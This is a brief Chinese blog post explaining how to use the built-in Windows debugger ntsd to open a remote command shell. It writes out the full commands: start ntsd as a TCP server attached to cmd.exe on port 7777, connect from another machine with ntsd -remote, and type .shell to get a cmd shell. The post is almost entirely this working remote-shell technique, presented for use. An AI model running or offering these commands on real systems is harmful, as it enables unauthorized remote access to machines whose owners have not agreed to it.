---
layout: post
title: "使用ntsd反弹端口获取shell"
description: ""
category: 技术研究
tags: [windows,ntsd]
---
{% include JB/setup %}

ntsd功能还是非常强大的,windows也有很多花样可以玩

xp测试OK.win7 ntsd找不到命令
 
我们这次利用ntsd来实现利用系统自带的ntsd实现端口转发，本地获取shell

我们的服务器端执行

	ntsd -server tcp:port=7777 cmd.exe
	 

这里的cmd.exe只是获得一个宿主进程，当然mstsc.exe 、 calc.exe等等都是可以的

然后我们的电脑，也就是客户机运行


 
	ntsd   -remote   tcp:server=服务器ip,port=7777
 
 

运行后会弹出一个窗口，我们输入

	.shell

即可成功获得cmdshell
